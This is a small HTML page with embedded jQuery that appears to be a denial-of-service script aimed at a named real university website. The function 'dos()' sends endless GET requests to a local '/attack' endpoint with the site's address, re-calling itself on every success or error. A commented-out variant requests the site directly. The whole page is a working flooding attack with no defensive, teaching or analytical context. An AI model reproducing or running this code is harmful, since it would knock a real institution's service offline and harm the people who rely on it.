<!DOCTYPE html>
<html>
<head>
	<title></title>
	<script type="text/javascript" src="{{ asset('js/app.js') }}"></script>
	
</head>
<body>

<script type="text/javascript">
	
		function dos(){
			// $.get("http://www.imissu.unud.ac.id").done(function (data) {
			//     console.log(data);
			//     dos();
			// });

			var url = '/attack';
			$.ajax({
				type:'get',
				url:url,
				data:{
					address:'http://imissu.unud.ac.id'
				},
				success: function(){
					// console.log('success');
					dos();
				},
				error: function(){
					dos();
				}
			})
		}
	
	dos();
</script>


</body>
</html>